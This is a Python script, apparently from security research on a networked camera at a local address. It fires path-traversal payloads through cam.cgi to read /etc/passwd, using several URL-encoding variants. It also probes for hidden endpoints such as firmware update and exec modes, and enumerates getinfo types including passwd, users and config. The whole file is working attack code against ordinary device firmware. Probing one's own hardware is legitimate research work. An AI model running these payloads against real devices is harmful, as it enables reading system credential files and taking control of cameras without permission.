#!/usr/bin/env python3
import sys, common as c
HOST='192.168.1.131'
ka=c.KA(HOST,80,timeout=12)

def health():
    st,hd,body,el=ka.request("GET","/cam.cgi?mode=getstate")
    try: return c.parse_camrply(body).get('result')
    except: return 'parse_err'

def go(tag, method, path, body=None):
    ka.close()
    st,hd,rd,el=ka.request(method, path, body=body)
    body_str = rd[:200]
    print("%-26s %s %s\n    -> %s %s | %s" % (tag, method, path, st, el, body_str))
    return st,hd,rd

print("HEALTH:", health())

# ---- A. path-based traversal through cam.cgi ----
paths = [
 "/cam.cgi/../../etc/passwd",
 "/cam.cgi/../../../etc/passwd",
 "/cam.cgi/../../../../etc/passwd",
 "/cam.cgi/..%2f..%2f..%2f..%2fetc/passwd",
 "/cam.cgi/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
 "/cam.cgi/..%252f..%252f..%252fetc/passwd",
 "/cam.cgi/....//....//....//etc/passwd",
 "/cam.cgi/..%5c..%5c..%5c..%5cetc/passwd",
 "/cam.cgi/....//....//....//....//etc/passwd",
 "/..%2f..%2f..%2f..%2f..%2fetc/passwd",
 "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
 "/..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
 "/cam.cgi?mode=getstate&path=/etc/passwd",
 "/cam.cgi?mode=getstate&file=/etc/passwd",
 "/cam.cgi?mode=getfile&path=/etc/passwd",
 "/cam.cgi?mode=read&path=/etc/passwd",
]
print("\n=== A. path traversal ===")
for p in paths:
    try: go("PT", "GET", p)
    except Exception as e: print("PT err", e)
print("HEALTH after A:", health())

# ---- B. hidden CGI endpoints ----
print("\n=== B. hidden CGI / endpoints ===")
cands = [
 "/cam2.cgi?mode=getstate","/camera.cgi?mode=getstate","/index.cgi",
 "/api/","/api/state","/upload","/firmware","/fwupdate","/update",
 "/cgi/","/goahead","/status","/admin","/login","/auth","/webcam",
 "/cam.cgi?mode=version","/cam.cgi?mode=getversion","/cam.cgi?mode=info",
 "/cam.cgi?mode=upload","/cam.cgi?mode=fwupdate","/cam.cgi?mode=update",
 "/cam.cgi?mode=set","/cam.cgi?mode=setvalue","/cam.cgi?mode=exec",
]
for p in cands:
    try: go("CGI", "GET", p)
    except Exception as e: print("CGI err", e)
print("HEALTH after B:", health())

# ---- C. getinfo type enumeration ----
print("\n=== C. getinfo type enumeration ===")
for t in ["camsetting","setting","settings","file","files","version","firmware","info","status","list","dir","sd","storage","log","logs","user","users","pass","passwd","config","cfg","param","params"]:
    try: go("GI", "GET", "/cam.cgi?mode=getinfo&type="+t)
    except Exception as e: print("GI err", e)
print("HEALTH after C:", health())
ka.close()
